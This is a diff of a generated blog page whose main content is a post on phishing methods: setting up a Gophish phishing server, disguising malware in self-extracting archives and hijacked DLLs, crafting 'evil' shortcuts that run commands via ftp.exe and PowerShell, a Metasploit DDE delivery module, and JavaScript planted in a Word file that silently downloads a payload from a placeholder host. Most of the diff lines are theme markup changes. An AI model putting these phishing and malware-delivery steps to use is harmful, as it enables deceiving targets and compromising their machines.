@@ -34,8 +34,8 @@
     
     <script class="keep-theme-configurations">
     const KEEP = window.KEEP || {}
-    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.xml"}
-    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.21"},"waline":{"server_url":null,"reaction":false,"version":2},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2018,"word_count":true,"icp":{"enable":false,"record_code":null,"url":"https://beian.miit.gov.cn"},"site_deploy":{"enable":false,"provider":"github","url":null},"shields_style":{"enable":false,"custom":[{"link_url":null,"img_url":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.1.0"}
+    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
+    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"Relish the Moment","author":"TyeYeah","avatar":"/img/aliwangwang.svg","logo":"/images/logo.svg","favicon":"/img/wang.svg"},"menu":{"home":"/","archives":"/archives","tags":"/tags","categories":"/categories","about":"/about"},"first_screen":{"enable":true,"background_img":"/images/bg2.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":true,"links":{"github":"https://github.com/tyeyeah","weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":true,"percent":true,"hide_header":false},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"updated"},"post":{"author_badge":{"enable":true,"level_badge":true,"custom_badge":["One","Two","Three"]},"word_count":{"wordcount":true,"min2read":true},"datetime_format":"YYYY-MM-DD HH:mm:ss","copyright_info":false,"share":false,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"default"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":false,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":true,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
     KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
     KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
     KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
@@ -65,7 +65,7 @@
 <header class="header-wrapper">
 
     <div class="border-box header-content">
-        <div class="left border-box">
+        <div class="left flex-start border-box">
             
                 <a class="logo-image border-box" href="/">
                     <img src="/images/logo.svg">
@@ -77,67 +77,67 @@
         </div>
 
         <div class="right border-box">
-            <div class="pc">
-                <ul class="menu-list">
+            <div class="pc border-box">
+                <ul class="menu-list border-box">
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/">
                                 
                                 HOME
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/archives"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/archives">
                                 
                                 ARCHIVES
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/tags"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/tags">
                                 
                                 TAGS
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/categories"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/categories">
                                 
                                 CATEGORIES
+                                
                             </a>
+                            
                         </li>
                     
                         
-                        <li class="menu-item">
-                            <a class=""
-                               href="/about"
-                            >
+                        <li class="menu-item flex-start border-box">
+                            <a class="menu-text-color border-box" href="/about">
                                 
                                 ABOUT
+                                
                             </a>
+                            
                         </li>
                     
                     
                         <li class="menu-item search search-popup-trigger">
-                            <i class="fas search fa-search"></i>
+                            <i class="menu-text-color fas search fa-search"></i>
                         </li>
                     
                 </ul>
             </div>
-            <div class="mobile">
+            <div class="mobile border-box flex-start">
                 
                     <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                 
@@ -149,41 +149,66 @@
     </div>
 
     <div class="header-drawer">
-        <ul class="drawer-menu-list">
+        <ul class="drawer-menu-list border-box">
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/"
-                    >HOME</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
+                            
+                            HOME
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/archives"
-                    >ARCHIVES</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
+                            
+                            ARCHIVES
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/tags"
-                    >TAGS</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
+                            
+                            TAGS
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/categories"
-                    >CATEGORIES</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
+                            
+                            CATEGORIES
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
                 
-                <li class="drawer-menu-item flex-center">
-                    <a class=""
-                       href="/about"
-                    >ABOUT</a>
+                <li class="drawer-menu-item border-box not-sub-menu">
+                    <label class="drawer-menu-label border-box">
+                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/about">
+                            
+                            ABOUT
+                        </a>
+                        
+                    </label>
+                    
                 </li>
             
         </ul>
@@ -241,10 +266,12 @@
                 <span class="datetime">2022-08-06 17:05:01</span>
             </span>
 
-            <span class="meta-info-item post-update-date">
-                <i class="icon fa-solid fa-file-pen"></i>&nbsp;
-                <span class="datetime" data-updated="Sun Nov 27 2022 16:27:50 GMT+0800">2022-11-27 16:27:50</span>
-            </span>
+            
+                <span class="meta-info-item post-update-date">
+                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
+                    <span class="datetime" data-updated="Sun Nov 27 2022 16:27:50 GMT+0800">2022-11-27 16:27:50</span>
+                </span>
+            
         
 
         
@@ -297,10 +324,11 @@
                     </div>
                 
 
-                <div class="post-content keep-markdown-body">
+                <div class="post-content keep-markdown-body ">
                     
 
-                    <p>This article shows methods of phishing, including setting up a phishing mail server, preparing malware (PE) which deceives the target to access, and preparing evil documents&#x2F;tables based on Office suite.</p>
+                    
+                         <p>This article shows methods of phishing, including setting up a phishing mail server, preparing malware (PE) which deceives the target to access, and preparing evil documents&#x2F;tables based on Office suite.</p>
 <h2 id="Set-Up-Phishing-Mail-Server"><a href="#Set-Up-Phishing-Mail-Server" class="headerlink" title="Set Up Phishing Mail Server"></a>Set Up Phishing Mail Server</h2><p>Buy similar domains, and prepare two server, one for mail server and another for phishing server.</p>
 <p>Phishing server:</p>
 <ul>
@@ -308,11 +336,11 @@
 <li><a class="link"   target="_blank" rel="noopener" href="https://gitee.com/laowu5/EwoMail" >EwoMail<i class="fas fa-external-link-alt"></i></a></li>
 </ul>
 <p>To use <a class="link"   target="_blank" rel="noopener" href="https://github.com/gophish/gophish" >Gophish<i class="fas fa-external-link-alt"></i></a>, download the <a class="link"   target="_blank" rel="noopener" href="https://github.com/gophish/gophish/releases" >releases<i class="fas fa-external-link-alt"></i></a> and configure the <code>config.json</code>.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─<span class="comment"># unzip gophish-v0.11.0-linux-64bit.zip</span></span><br><span class="line">Archive:  gophish-v0.11.0-linux-64bit.zip</span><br><span class="line">  inflating: gophish</span><br><span class="line">   creating: static/js/dist/</span><br><span class="line">   creating: static/js/dist/app/</span><br><span class="line">  inflating: static/js/dist/app/landing_pages.min.js</span><br><span class="line">    ...</span><br><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─<span class="comment"># ls</span></span><br><span class="line">config.json  gophish                          LICENSE    static     VERSION</span><br><span class="line">db           gophish-v0.11.0-linux-64bit.zip  README.md  templates</span><br><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─<span class="comment"># chmod +x gophish</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─# unzip gophish-v0.11.0-linux-64bit.zip</span><br><span class="line">Archive:  gophish-v0.11.0-linux-64bit.zip</span><br><span class="line">  inflating: gophish</span><br><span class="line">   creating: static/js/dist/</span><br><span class="line">   creating: static/js/dist/app/</span><br><span class="line">  inflating: static/js/dist/app/landing_pages.min.js</span><br><span class="line">    ...</span><br><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─# <span class="built_in">ls</span></span><br><span class="line">config.json  gophish                          LICENSE    static     VERSION</span><br><span class="line">db           gophish-v0.11.0-linux-64bit.zip  README.md  templates</span><br><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─# <span class="built_in">chmod</span> +x gophish</span><br></pre></td></tr></table></figure>
 <p>Modify the content of <code>config.json</code>:</p>
-<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="attr">&quot;admin_server&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;listen_url&quot;</span>: <span class="string">&quot;0.0.0.0:xx&quot;</span>, <span class="comment">// port to manage (https)</span></span><br><span class="line">		<span class="attr">&quot;use_tls&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">		<span class="attr">&quot;cert_path&quot;</span>: <span class="string">&quot;gophish_admin.crt&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;key_path&quot;</span>: <span class="string">&quot;gophish_admin.key&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">&quot;phish_server&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;listen_url&quot;</span>: <span class="string">&quot;0.0.0.0:xxxx&quot;</span>, <span class="comment">// port to phish (https)</span></span><br><span class="line">		<span class="attr">&quot;use_tls&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">		<span class="attr">&quot;cert_path&quot;</span>: <span class="string">&quot;example.crt&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;key_path&quot;</span>: <span class="string">&quot;example.key&quot;</span></span><br><span class="line">	&#125;,</span><br><span class="line">	<span class="attr">&quot;db_name&quot;</span>: <span class="string">&quot;sqlite3&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;db_path&quot;</span>: <span class="string">&quot;gophish.db&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;migrations_prefix&quot;</span>: <span class="string">&quot;db/db_&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;contact_address&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">	<span class="attr">&quot;logging&quot;</span>: &#123;</span><br><span class="line">		<span class="attr">&quot;filename&quot;</span>: <span class="string">&quot;&quot;</span>,</span><br><span class="line">		<span class="attr">&quot;level&quot;</span>: <span class="string">&quot;&quot;</span></span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">	<span class="attr">&quot;admin_server&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;listen_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.0.0:xx&quot;</span><span class="punctuation">,</span> <span class="comment">// port to manage (https)</span></span><br><span class="line">		<span class="attr">&quot;use_tls&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;cert_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gophish_admin.crt&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;key_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gophish_admin.key&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;phish_server&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;listen_url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;0.0.0.0:xxxx&quot;</span><span class="punctuation">,</span> <span class="comment">// port to phish (https)</span></span><br><span class="line">		<span class="attr">&quot;use_tls&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;cert_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example.crt&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;key_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;example.key&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;db_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;sqlite3&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;db_path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;gophish.db&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;migrations_prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;db/db_&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;contact_address&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">	<span class="attr">&quot;logging&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">		<span class="attr">&quot;filename&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">		<span class="attr">&quot;level&quot;</span><span class="punctuation">:</span> <span class="string">&quot;&quot;</span></span><br><span class="line">	<span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
 <p>Start server, and it will show the initial username &amp; password.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─<span class="comment"># ./gophish</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:08+08:00&quot;</span> level=warning msg=<span class="string">&quot;No contact address has been configured.&quot;</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:08+08:00&quot;</span> level=warning msg=<span class="string">&quot;Please consider adding a contact_address entry in your config.json&quot;</span></span><br><span class="line">goose: migrating db environment <span class="string">&#x27;production&#x27;</span>, current version: 0, target: 20200730000000</span><br><span class="line">OK    20160118194630_init.sql</span><br><span class="line">OK    20160131153104_0.1.2_add_event_details.sql</span><br><span class="line">...</span><br><span class="line">OK    20200619000000_0.11.0_password_policy.sql</span><br><span class="line">OK    20200730000000_0.11.0_imap_ignore_cert_errors.sql</span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Please login with the username admin and the password e98a19c956ca1cc2&quot;</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Starting phishing server at http://0.0.0.0:xxx&quot;</span></span><br><span class="line">time=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Starting IMAP monitor manager&quot;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/gophish]</span><br><span class="line">└─# ./gophish</span><br><span class="line"><span class="keyword">time</span>=<span class="string">&quot;2022-08-08T16:05:08+08:00&quot;</span> level=warning msg=<span class="string">&quot;No contact address has been configured.&quot;</span></span><br><span class="line"><span class="keyword">time</span>=<span class="string">&quot;2022-08-08T16:05:08+08:00&quot;</span> level=warning msg=<span class="string">&quot;Please consider adding a contact_address entry in your config.json&quot;</span></span><br><span class="line">goose: migrating db environment <span class="string">&#x27;production&#x27;</span>, current version: 0, target: 20200730000000</span><br><span class="line">OK    20160118194630_init.sql</span><br><span class="line">OK    20160131153104_0.1.2_add_event_details.sql</span><br><span class="line">...</span><br><span class="line">OK    20200619000000_0.11.0_password_policy.sql</span><br><span class="line">OK    20200730000000_0.11.0_imap_ignore_cert_errors.sql</span><br><span class="line"><span class="keyword">time</span>=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Please login with the username admin and the password e98a19c956ca1cc2&quot;</span></span><br><span class="line"><span class="keyword">time</span>=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Starting phishing server at http://0.0.0.0:xxx&quot;</span></span><br><span class="line"><span class="keyword">time</span>=<span class="string">&quot;2022-08-08T16:05:09+08:00&quot;</span> level=info msg=<span class="string">&quot;Starting IMAP monitor manager&quot;</span></span><br></pre></td></tr></table></figure>
 
 <p>As for EwoMail, it has detailed documents.</p>
 <p>Collect target email:</p>
@@ -347,7 +375,7 @@
 <li>configure the silence mode to <code>hide all</code>.</li>
 <li><code>update</code> and <code>overlap</code> files when extracting.</li>
 </ul>
-<h3 id="DLL-Hijacking-amp-Recreate-the-Installer"><a href="#DLL-Hijacking-amp-Recreate-the-Installer" class="headerlink" title="DLL Hijacking &amp; Recreate the Installer"></a>DLL Hijacking &amp; Recreate the Installer</h3><p>They are also common methods to execute malware, and here provide some sample tools:</p>
+<h3 id="DLL-Hijacking-Recreate-the-Installer"><a href="#DLL-Hijacking-Recreate-the-Installer" class="headerlink" title="DLL Hijacking &amp; Recreate the Installer"></a>DLL Hijacking &amp; Recreate the Installer</h3><p>They are also common methods to execute malware, and here provide some sample tools:</p>
 <ul>
 <li><a class="link"   target="_blank" rel="noopener" href="https://github.com/strivexjun/AheadLib-x86-x64" >AheadLib<i class="fas fa-external-link-alt"></i></a></li>
 <li><a class="link"   target="_blank" rel="noopener" href="https://github.com/coca1ne/DLL_Hijacker" >DLL_Hijacker<i class="fas fa-external-link-alt"></i></a></li>
@@ -356,7 +384,7 @@
 <li><a class="link"   target="_blank" rel="noopener" href="https://jrsoftware.org/isinfo.php" >Inno Setup<i class="fas fa-external-link-alt"></i></a></li>
 <li>Easy setup</li>
 </ul>
-<h2 id="Make-Evil-Links-x2F-Shotcuts"><a href="#Make-Evil-Links-x2F-Shotcuts" class="headerlink" title="Make Evil Links&#x2F;Shotcuts"></a>Make Evil Links&#x2F;Shotcuts</h2><p>We can create a blank shotcut, and modify the target command.</p>
+<h2 id="Make-Evil-Links-Shotcuts"><a href="#Make-Evil-Links-Shotcuts" class="headerlink" title="Make Evil Links&#x2F;Shotcuts"></a>Make Evil Links&#x2F;Shotcuts</h2><p>We can create a blank shotcut, and modify the target command.</p>
 <p>For example, <code>ftp</code> can be used to execute commands by adding <code>!</code>:  </p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># ftp</span><br><span class="line">ftp&gt; whoami</span><br><span class="line">?Invalid command.</span><br><span class="line">ftp&gt; !whoami</span><br><span class="line">root</span><br><span class="line">ftp&gt; !echo 222</span><br><span class="line">222</span><br><span class="line">ftp&gt; !pwd</span><br><span class="line">/root</span><br><span class="line">ftp&gt;</span><br></pre></td></tr></table></figure>
 <p>So on Windows the <code>ftp.exe</code> can cooperate with <code>powershell</code> scripts.<br>In <code>Target</code> of the <code>Shotcut</code> we write: </p>
@@ -415,7 +443,7 @@
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/fileformat/office_dde_delivery</span><br><span class="line">set lport xx</span><br><span class="line">set lhost xx.xx.xx.xx</span><br></pre></td></tr></table></figure>
 
 <h3 id="JS"><a href="#JS" class="headerlink" title="JS"></a>JS</h3><p>If we insert online videos in word, the item <code>embeddedHtml</code> in <code>word/document.xml</code> of word compressed file will have corresponding html codes. We can modify these html to insert evil javascript, like:</p>
-<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript"><span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">&#x27;a&#x27;</span>);</span></span><br><span class="line"><span class="javascript"><span class="built_in">console</span>.log(a);</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.body.appendChild(a);</span></span><br><span class="line"><span class="javascript">a.style = <span class="string">&#x27;display: none&#x27;</span>;</span></span><br><span class="line"><span class="javascript">a.href = <span class="string">&quot;http://x.x.x.x:xx/xxx&quot;</span>;</span></span><br><span class="line"><span class="javascript">a.download = fileName;</span></span><br><span class="line"><span class="javascript"><span class="built_in">window</span>.URL.revokeObjectURL(url);</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">a.click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> a = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">console</span>.<span class="title function_">log</span>(a);</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(a);</span></span><br><span class="line"><span class="language-javascript">a.<span class="property">style</span> = <span class="string">&#x27;display: none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">a.<span class="property">href</span> = <span class="string">&quot;http://x.x.x.x:xx/xxx&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">a.<span class="property">download</span> = fileName;</span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">revokeObjectURL</span>(url);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span></span><br><span class="line">a.click();</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
